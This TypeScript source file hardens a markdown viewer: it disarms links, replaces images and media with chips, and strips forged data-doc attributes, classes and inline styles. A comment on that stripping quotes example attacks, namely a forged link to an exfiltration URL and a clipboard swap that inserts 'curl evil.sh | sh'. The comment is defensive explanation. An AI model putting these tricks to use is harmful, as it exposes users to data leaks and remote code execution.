// Turning a markdown file into the body the viewer shows (P2-E16-02, §5.30).
//
// Everything here runs AFTER `renderMarkdown` — that module owns `marked` and
// DOMPurify and nothing else may import either (`markdown.test.tsx` asserts
// it). This is the layer §5.30 asks for on top of the sanitized HTML: heading
// anchors and an outline, a language label and a copy button on code fences,
// front matter as a chip, wide tables in their own scroll container, and the
// two security decorations — remote images become click-to-load chips, and
// every link becomes inert until our own handler decides what it means.
//
// IT DECORATES AN INERT FRAGMENT, NOT THE LIVE PAGE, and that is load-bearing
// rather than tidy. Setting `innerHTML` on an element that is IN the document
// starts fetching every `src` on the spot; the CSP would refuse them, but "the
// request was blocked" and "the request was never made" are different
// promises, and §5.30 makes the second one ("a tracking pixel in a markdown
// file is both a beacon and a read-receipt canary"). A `<template>`'s contents
// live in an inert document with no browsing context, so nothing loads while
// we work — by the time the nodes reach the page the `<img>` elements are
// gone.
export interface OutlineEntry {
  readonly id: string;
  readonly text: string;
  /** 1-6, straight off the tag */
  readonly level: number;
}

/** Copy the viewer supplies, so this module holds no English. */
export interface DecorationLabels {
  copy: string;
  /** "Image", the chip's own word */
  image: string;
  openInBrowser: string;
  /** "Media not shown", for a `<video>`/`<audio>` we refuse to fetch */
  mediaOmitted: string;
}

export interface DecorateResult {
  /** the decorated nodes, still inert — the caller adopts them */
  readonly fragment: DocumentFragment;
  readonly outline: readonly OutlineEntry[];
}

/** What `splitFrontMatter` found. */
export interface FrontMatterSplit {
  /** the YAML between the fences, without them — undefined when there is none */
  readonly frontMatter?: string;
  /** the document with the front matter removed */
  readonly body: string;
}

/**
 * Peel a YAML front-matter block off the top of a document.
 *
 * §5.30: "YAML front matter as a collapsed metadata chip, not an `<hr>` and a
 * line of garbage" — which is what `marked` does with it, because `---` on its
 * own line is a horizontal rule and the next line is a setext heading.
 *
 * The rules are jekyll's, and tight on purpose: the opening fence must be the
 * FIRST line, and the closing fence must be a line of exactly `---` (or `...`,
 * which YAML also ends a document with). Anything looser starts eating the
 * `---` separators people put between sections.
 */
export function splitFrontMatter(text: string): FrontMatterSplit {
  const match = /^---\r?\n/.exec(text);
  if (!match) return { body: text };
  const rest = text.slice(match[0].length);
  const close = /^(?:---|\.\.\.)[ \t]*\r?(?:\n|$)/m.exec(rest);
  if (!close || close.index === undefined) return { body: text };
  return {
    frontMatter: rest.slice(0, close.index).replace(/\r?\n$/, ''),
    body: rest.slice(close.index + close[0].length),
  };
}

/**
 * A heading's anchor id.
 *
 * GitHub's algorithm, which is the one every markdown file in this repository
 * was written against: lower-case, drop everything that is not a word
 * character, a space or a hyphen, then spaces become hyphens. Getting this
 * wrong does not break a link — it breaks EVERY cross-document link, silently,
 * because a `#missing-anchor` just scrolls nowhere.
 */
export function slugify(text: string): string {
  return text
    .trim()
    .toLowerCase()
    .replace(/[^\p{L}\p{N} \-_]/gu, '')
    // Each space becomes ONE hyphen, and runs are NOT collapsed. That is
    // GitHub's behaviour and it is why `5.30 Document viewer — rendered` is
    // `530-document-viewer--rendered`: the em dash was deleted by the line
    // above and the two spaces that surrounded it both survive. Collapsing
    // here would break every anchor into a heading that contains punctuation,
    // which in this repository is most of them.
    .replace(/\s/g, '-');
}

/** Ids must be unique in a document; GitHub suffixes repeats with -1, -2, … */
function uniqueId(base: string, seen: Map<string, number>): string {
  const root = base.length > 0 ? base : 'section';
  const n = seen.get(root) ?? 0;
  seen.set(root, n + 1);
  return n === 0 ? root : `${root}-${n}`;
}

/** Headings get ids and a click-to-copy anchor; the outline falls out of it. */
export function decorateHeadings(root: ParentNode): OutlineEntry[] {
  const seen = new Map<string, number>();
  const outline: OutlineEntry[] = [];
  for (const h of root.querySelectorAll('h1, h2, h3, h4, h5, h6')) {
    const text = (h.textContent ?? '').trim();
    const id = uniqueId(slugify(text), seen);
    h.setAttribute('id', id);
    h.classList.add('doc-heading');
    outline.push({ id, text, level: Number(h.tagName.slice(1)) });
  }
  return outline;
}

/**
 * The language of a fence, from the class `marked` writes (`language-ts`).
 *
 * Exported because "what does the label say for an unfenced block" is the kind
 * of thing that deserves a test rather than an eyeball.
 */
export function fenceLanguage(code: Element | null): string {
  if (!code) return '';
  for (const cls of code.classList) {
    if (cls.startsWith('language-')) return cls.slice('language-'.length);
  }
  return '';
}

/**
 * Fenced code gets a header: the language, and a copy button.
 *
 * "you copy the command it just gave you" (§5.30). The button carries no text
 * of the code — the click handler reads it off the `<pre>` at the moment of
 * the click, so a re-render cannot leave a button copying a stale snippet.
 */
export function decorateCodeFences(root: ParentNode, labels: DecorationLabels): void {
  for (const pre of [...root.querySelectorAll('pre')]) {
    const doc = pre.ownerDocument;
    const wrap = doc.createElement('div');
    wrap.className = 'doc-code';
    const head = doc.createElement('div');
    head.className = 'doc-code-head';
    const lang = doc.createElement('span');
    lang.className = 'doc-code-lang';
    lang.textContent = fenceLanguage(pre.querySelector('code'));
    const copy = doc.createElement('button');
    copy.type = 'button';
    copy.className = 'doc-code-copy';
    copy.textContent = labels.copy;
    copy.setAttribute('data-doc-copy', '');
    head.append(lang, copy);
    pre.replaceWith(wrap);
    wrap.append(head, pre);
  }
}

/** Wide tables scroll in their own container, not the document (§5.30). */
export function decorateTables(root: ParentNode): void {
  for (const table of [...root.querySelectorAll('table')]) {
    const wrap = table.ownerDocument.createElement('div');
    wrap.className = 'doc-table-wrap';
    // `tabindex` because a scroll container that only a mouse can reach is not
    // reachable: a keyboard user needs to be able to focus it to scroll it.
    wrap.setAttribute('tabindex', '0');
    wrap.setAttribute('role', 'group');
    table.replaceWith(wrap);
    wrap.append(table);
  }
}

/** GFM task lists — agents write plans as `- [ ]`, so this is most of them. */
export function decorateTaskLists(root: ParentNode): void {
  for (const box of root.querySelectorAll('input[type="checkbox"]')) {
    // Belt to DOMPurify's braces: a checkbox in a rendered document is never
    // interactive, whatever the markup said.
    box.setAttribute('disabled', '');
    box.classList.add('doc-task-box');
    const li = box.closest('li');
    if (li) {
      li.classList.add('doc-task');
      li.parentElement?.classList.add('doc-task-list');
    }
  }
}

/**
 * Every image becomes a chip, and the `<img>` is DELETED.
 *
 * §5.30 asks for this for the remote case — "CSP stays `'self'`, so remote
 * images do not load — they render as a click-to-load chip" — and v1 gives a
 * LOCAL image the same chip, which is the one place this item lands short of
 * the design. Rendering a local image needs the scoped protocol handler §5.30
 * describes ("resolves the path and refuses anything outside the document's
 * root, symlinks included"), which is main-process infrastructure this item
 * does not build; until it exists, `file:` is refused by the CSP just as
 * `https:` is, and a chip that says so beats a broken-image glyph that does
 * not. The chip carries the source in its tooltip either way, and for an
 * http(s) image it carries a button that opens it in the browser — which is
 * what "load it" can honestly mean while the CSP holds.
 */
export function decorateImages(root: ParentNode, labels: DecorationLabels): void {
  for (const img of [...root.querySelectorAll('img')]) {
    const doc = img.ownerDocument;
    const src = img.getAttribute('src') ?? '';
    const alt = img.getAttribute('alt') ?? '';
    const chip = doc.createElement('span');
    chip.className = 'doc-image-chip';
    chip.setAttribute('title', src);
    const icon = doc.createElement('span');
    icon.className = 'doc-image-icon';
    icon.setAttribute('aria-hidden', 'true');
    icon.textContent = '▣';
    const name = doc.createElement('span');
    name.className = 'doc-image-name';
    name.textContent = alt.trim().length > 0 ? alt : (src.split(/[\\/]/).pop() ?? labels.image);
    chip.append(icon, name);
    if (/^https?:/i.test(src)) {
      const open = doc.createElement('button');
      open.type = 'button';
      open.className = 'doc-image-open';
      open.textContent = labels.openInBrowser;
      open.setAttribute('data-doc-external', src);
      chip.append(open);
    }
    img.replaceWith(chip);
  }
}

/**
 * Anything that would fetch on its own is removed outright.
 *
 * `<video>`, `<audio>` and their `<source>` children survive DOMPurify's html
 * profile, and a `src` on any of them is a request the moment the node reaches
 * the page. There is no v1 story for playing media inside a document, so there
 * is nothing to weigh against deleting them.
 */
export function stripMedia(root: ParentNode, labels: DecorationLabels): void {
  for (const el of [...root.querySelectorAll('video, audio, iframe, embed, object')]) {
    const chip = el.ownerDocument.createElement('span');
    chip.className = 'doc-media-chip';
    chip.textContent = labels.mediaOmitted;
    el.replaceWith(chip);
  }
}

/**
 * Every link is disarmed and re-labelled for our own handler.
 *
 * THE `href` IS REMOVED — from every link, including the ones we will happily
 * open. A `preventDefault` in a click handler covers a plain click and nothing
 * else: middle-click, ctrl-click, "open in new window" from the context menu
 * and a keyboard Enter all navigate a live `href`, and a navigation inside the
 * viewer's own webContents is exactly what §5.30 forbids ("No in-app
 * navigation to remote content, ever"). Without an `href` there is nothing to
 * navigate to, and the intent lives in a data attribute only our handler
 * reads.
 *
 * `role="link"` and `tabindex` put the affordance back for a screen reader and
 * the keyboard; the component's handler answers Enter as well as click.
 */
export function decorateLinks(
  root: ParentNode,
  classify: (href: string | null) => { kind: string; target: string; hash?: string }
): void {
  for (const a of root.querySelectorAll('a')) {
    const decision = classify(a.getAttribute('href'));
    a.removeAttribute('href');
    a.removeAttribute('target');
    a.setAttribute('data-doc-link', decision.kind);
    if (decision.kind === 'blocked') {
      // Not a link at all — it renders as the text it always was, with no
      // affordance suggesting anything will happen, because nothing will.
      a.classList.add('doc-link-blocked');
      continue;
    }
    a.setAttribute('data-doc-target', decision.target);
    if (decision.hash) a.setAttribute('data-doc-hash', decision.hash);
    a.setAttribute('role', 'link');
    a.setAttribute('tabindex', '0');
    a.classList.add('doc-link', `doc-link-${decision.kind}`);
  }
}

/**
 * Take back the attributes and classes that are OURS.
 *
 * THE DECORATION IS A PROTOCOL, AND A DOCUMENT MUST NOT BE ABLE TO SPEAK IT.
 * Everything below writes `data-doc-*` attributes and `doc-*` classes that the
 * viewer's click handler then reads as instructions — and DOMPurify keeps
 * `data-*` attributes (`ALLOW_DATA_ATTR` defaults to true) and `class`. So a
 * file we did not write can arrive with the answers already filled in:
 *
 *   <a href="javascript:…" data-doc-external="https://exfil.test/?leak">click</a>
 *
 * — which `decorateLinks` correctly classifies as `blocked` and renders inert,
 * and which the handler's earlier `[data-doc-external]` branch then opens in
 * the browser anyway. Same trick forges a link out of a `<span>`, and forges a
 * `.doc-code` wrapper around a hidden `<pre>` so that the copy button on a
 * fence reading `npm test` puts `curl evil.sh | sh` on the clipboard.
 *
 * The fix is not to reorder the handler's branches — it is that no attribute in
 * our namespace may survive from the input. Run FIRST, before anything writes
 * one.
 *
 * `style` goes with them, and it is BELT-AND-BRACES, not the policy. The policy
 * is `SANITIZE_CONFIG`'s `FORBID_ATTR: ['style']` in `markdown.tsx` — #436, and
 * for the reasons this comment used to give on the viewer's behalf: an inline
 * style is what made the hidden `<pre>` invisible (`style-src` allows inline
 * styles), a `position:fixed` overlay from a document is a click-jack against
 * the viewer's own chrome, and markdown emits none of it — only raw embedded
 * markup does, which is exactly the input §5.30 says to distrust. That reasoning
 * was never viewer-specific, and while it lived HERE the feed did not get it: one
 * exported constant, two effective profiles, which is the drift §5.30 makes the
 * single renderer a requirement to prevent.
 *
 * The line stays anyway. Not for a caller that exists — today every caller comes
 * through `renderMarkdown`, and `markdown.test.tsx` enforces that there is no
 * other pipeline to come through. It stays because this function's whole job is
 * to assume nothing about where its input has been: it already takes `style`'s
 * neighbours (`data-doc-*`, `doc-*`) back from HTML the sanitizer was perfectly
 * happy with, and dropping `style` from that list would make it the one
 * decoration-protocol attribute whose safety is somebody else's file. One
 * `||`, and the layer keeps its own invariant.
 */
export function stripOurNamespace(root: ParentNode): void {
  for (const el of root.querySelectorAll('*')) {
    for (const attr of [...el.attributes]) {
      if (attr.name.startsWith('data-doc') || attr.name === 'style') {
        el.removeAttribute(attr.name);
      }
    }
    for (const cls of [...el.classList]) {
      if (cls.startsWith('doc-')) el.classList.remove(cls);
    }
  }
}

/**
 * Sanitized HTML in, decorated inert nodes out.
 *
 * The caller adopts `fragment` into the live container — see the header note
 * on why the work happens off-page.
 */
export function decorateDocument(
  html: string,
  labels: DecorationLabels,
  classifyHref: (href: string | null) => { kind: string; target: string; hash?: string },
  doc: Document = document
): DecorateResult {
  const template = doc.createElement('template');
  template.innerHTML = html;
  const content = template.content;
  // BEFORE anything writes one of ours — see the function's own note.
  stripOurNamespace(content);
  // Images and media next: every other pass is cosmetic, and if one of them
  // throws we still want the fetching elements gone.
  decorateImages(content, labels);
  stripMedia(content, labels);
  decorateLinks(content, classifyHref);
  const outline = decorateHeadings(content);
  decorateCodeFences(content, labels);
  decorateTables(content);
  decorateTaskLists(content);
  return { fragment: content, outline };
}
